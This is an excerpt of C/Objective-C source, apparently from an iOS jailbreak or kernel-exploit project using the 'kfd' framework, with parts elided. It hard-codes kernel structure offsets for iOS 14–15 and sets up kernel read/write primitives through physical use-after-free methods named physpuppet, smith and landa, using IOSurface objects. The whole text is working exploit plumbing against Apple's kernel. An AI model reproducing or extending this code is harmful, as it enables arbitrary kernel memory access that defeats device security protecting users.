...
bool kfd_init_offline_offsets(void) {
    ...
    dynamic_system_info = (struct dynamic_info){
        ...
        .device__T1SZ_BOOT = 25ULL
    };
    
    // IOSurface offsets
    dynamic_system_info.IOSurface__isa = 0x0;
    dynamic_system_info.IOSurface__pixelFormat =  0xa4;
    dynamic_system_info.IOSurface__allocSize =  0xac;
    dynamic_system_info.IOSurface__useCountPtr = 0xc0;
    dynamic_system_info.IOSurface__indexedTimestampPtr = 0x360;
    dynamic_system_info.IOSurface__readDisplacement =  0x14;
    
    if (@available(iOS 15.0, *)) {
        
        // Proc offsets
        if (@available(iOS 15.2, *)) {
            dynamic_system_info.proc__p_fd__fd_ofiles = 0xF8;
        } else {
            dynamic_system_info.proc__p_fd__fd_ofiles = isArm64e() ? 0x100 : 0x110;
        }
        dynamic_system_info.proc__p_list__le_prev = 0x8;
        dynamic_system_info.proc__p_pid = 0x68;
        dynamic_system_info.proc__object_size = 0x4B0;
        
        // Task offsets
        dynamic_system_info.task__map = 0x28;
        
        // vm_map offsets
        dynamic_system_info.vm_map__hdr_links_prev = 0x10;
        dynamic_system_info.vm_map__hdr_links_next = 0x18;
        dynamic_system_info.vm_map__min_offset = 0x20;
        dynamic_system_info.vm_map__max_offset = 0x28;
        dynamic_system_info.vm_map__hdr_nentries = 0x30;
        dynamic_system_info.vm_map__hdr_nentries_u64 = 0x30;
        dynamic_system_info.vm_map__hdr_rb_head_store_rbh_root = 0x40;
        dynamic_system_info.vm_map__pmap = 0x48;
        dynamic_system_info.vm_map__hint = 0x100;
        dynamic_system_info.vm_map__hole_hint = 0x108;
        dynamic_system_info.vm_map__holes_list = 0x110;
        dynamic_system_info.vm_map__object_size = 0x128;
        if (@available(iOS 15.4, *)) {
            dynamic_system_info.vm_map__hdr_rb_head_store_rbh_root = 0x38;
            dynamic_system_info.vm_map__pmap = 0x40;
            dynamic_system_info.vm_map__hint = isArm64e() ? 0x80 : 0x78;
            dynamic_system_info.vm_map__hole_hint = 0x80;
            dynamic_system_info.vm_map__holes_list = 0x88;
            dynamic_system_info.vm_map__object_size = 0xA0;
        }
        
        // Thread offsets
        if (isArm64e()) {
            if (@available(iOS 15.4, *)) {
                dynamic_system_info.thread__thread_id = 0x440;
            } else if (@available(iOS 15.2, *)) {
                dynamic_system_info.thread__thread_id = 0x438;
            } else {
                dynamic_system_info.thread__thread_id = 0x560;
            }
        } else {
            if (@available(iOS 15.4, *)) {
                dynamic_system_info.thread__thread_id = 0x458;
            } else if (@available(iOS 15.2, *)) {
                dynamic_system_info.thread__thread_id = 0x460;
            } else {
                dynamic_system_info.thread__thread_id = 0x578;
            }
        }
        ...
        if (@available(iOS 14.5, *)) {
            dynamic_system_info.task__map = 0x20;
        } else {
            dynamic_system_info.task__map = 0x28;
        }
        ...
        dynamic_system_info.vm_map__pmap = 0x48;
        dynamic_system_info.vm_map__hint = 0xF0;
        dynamic_system_info.vm_map__hole_hint = 0xF8;
        dynamic_system_info.vm_map__holes_list = 0x100;
        dynamic_system_info.vm_map__object_size = 0x120;
...
bool krw_init(const char *flavor)
{
    ...
    if (kconstant(staticBase) != 0) {
        ...
        /* 
            We will use landa + IOSurface on iOS 14 (or iOS 15 when we cannot grab the kernel)
            This requires minimal offsets, and all
            of them can be statically defined
        */
        
        assert(kread_method == kread_IOSurface);
        assert(kwrite_method == kwrite_IOSurface);
        assert(method == puaf_landa || method == puaf_physpuppet);
        
        if (!kfd_init_offline_offsets()) {
            printf("Failed to initialise offline offsets for kfd\n");
            return false;
        }
    ...
    gSystemInfo.kernelConstant.currentProc = ((struct kfd *)gKfd)->info.kaddr.current_proc;
    gSystemInfo.kernelConstant.kernelProc = ((struct kfd *)gKfd)->info.kaddr.kernel_proc;
...
bool krw_init_physpuppet(void) {
    return krw_init("physpuppet");
}

bool krw_init_smith(void) {
    return krw_init("smith");
}

bool krw_init_landa(void) {
    return krw_init("landa");
}
